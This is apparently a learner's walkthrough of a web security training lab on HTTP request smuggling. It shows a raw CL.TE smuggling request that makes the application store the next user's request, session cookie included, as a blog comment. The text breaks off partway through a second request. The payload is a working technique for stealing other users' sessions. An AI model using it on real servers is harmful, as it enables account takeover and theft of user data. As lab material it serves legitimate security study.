Title: Exploiting HTTP request smuggling to capture other users' requests
Level: PRACTITIONER
Desc:  This lab involves a front-end and back-end server, and the front-end server doesn't support chunked encoding.
To solve the lab, smuggle a request to the back-end server that causes the next user's request to be stored in the application. Then retrieve the next user's request and use the victim user's cookies to access their account. 

# Walkthrough:
After sending this request: 
```
POST / HTTP/1.1
Host: 0a11000f039b816780f5d59d00710058.web-security-academy.net
Cookie: session=FgVe65lsnGn6ShEiLkmSgiSsiIoBYeKd
Transfer-Encoding: chunked
Content-Length: 341

0

POST /post/comment HTTP/1.1
Host: 0a11000f039b816780f5d59d00710058.web-security-academy.net
Cookie: session=FgVe65lsnGn6ShEiLkmSgiSsiIoBYeKd
Content-Length: 400
Content-Type: application/x-www-form-urlencoded


csrf=5qmS1O0v1YCPNsp6qYLm5gKXTlHxjl4n&postId=6&name=sdfsfd&email=sdf%40d.pl&website=https%3A%2F%2Fwebsite.com&comment=
```

I get comment on post number 6 filled by the data from victim's request.

This request was better because I've got victim's cookie:
```
POST / HTTP/1.1
Host: 0a11000f039b816780f5d59d00710058.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
